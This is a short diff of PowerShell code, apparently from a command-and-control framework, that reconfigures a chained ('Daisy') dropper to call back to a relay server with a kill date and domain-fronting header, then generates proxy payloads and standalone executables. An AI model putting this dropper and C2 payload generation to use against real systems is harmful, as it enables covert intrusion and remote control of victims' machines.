@@ -726,8 +726,9 @@ param(
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
 
-$command = createdropper -Daisy 1 -killdate $killdatefm -domainfrontheader $domfront -ipv4address $c2server -serverport $c2port -username $proxyuser -password $proxypassword -proxyurl $proxyurl
+$command = createdropper -Daisy 1 -killdate $killdatefm -domainfrontheader $domfront -ipv4address $daisyserver -serverport $port 
 $payload = createrawpayload -command $command
+
 # create proxy payloads
 CreatePayload -DaisyName $name
 CreateStandAloneExe -DaisyName $name
